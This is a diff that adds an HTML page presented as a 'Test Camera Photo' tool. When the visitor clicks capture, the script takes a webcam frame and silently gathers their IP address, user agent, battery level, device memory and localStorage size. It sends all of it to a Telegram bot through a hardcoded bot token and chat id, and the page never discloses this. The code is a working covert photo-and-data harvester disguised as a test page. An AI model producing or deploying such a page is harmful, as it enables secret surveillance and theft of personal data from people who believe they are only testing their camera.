@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Camera Photo</title>
+</head>
+<body>
+    <h1>Test Camera Photo</h1>
+    <video id="video" autoplay playsinline width="320" height="240"></video>
+    <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+    <button id="capture">Capture Photo</button>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('capture');
+        const ctx = canvas.getContext('2d');
+
+        // Initialize the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+            })
+            .catch((err) => {
+                console.error('Error accessing camera:', err);
+            });
+
+        // Capture the photo
+        captureButton.addEventListener('click', async () => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photo = canvas.toDataURL('image/png');
+            
+            // Collect additional information
+            const ua = navigator.userAgent;
+            const time = new Date().toLocaleString();
+            const localStorageSize = Object.keys(localStorage).length;
+            const memory = navigator.deviceMemory || 'Unknown';
+            let batteryInfo = 'Unknown';
+            let ip = 'Unknown';
+
+            // Get battery status
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
+            }
+
+            // Get IP address
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch (error) {
+                console.error('Error getting IP:', error);
+            }
+
+            // Prepare data to send
+            const data = {
+                photo: photo,
+                ip: ip,
+                ua: ua,
+                battery: batteryInfo,
+                time: time,
+                memory: memory,
+                localStorage: localStorageSize,
+            };
+
+            sendToTelegram(data);
+        });
+
+        // Function to send data to Telegram
+        async function sendToTelegram(data) {
+            const botToken = '7338358850:AAFz6U7TqF_d7vjd9QtRGf_BqX8u9cvHeL0';
+            const chatId = '7607840886';
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('caption', `IP: ${data.ip}\nUser Agent: ${data.ua}\nBattery: ${data.battery}\nTime: ${data.time}\nMemory: ${data.memory}\nLocalStorage: ${data.localStorage}`);
+            formData.append('photo', dataURItoBlob(data.photo));
+
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData,
+                });
+                const result = await res.json();
+                console.log('Telegram response:', result);
+            } catch (err) {
+                console.error('Error sending to Telegram:', err);
+            }
+        }
+
+        // Convert Data URI to Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
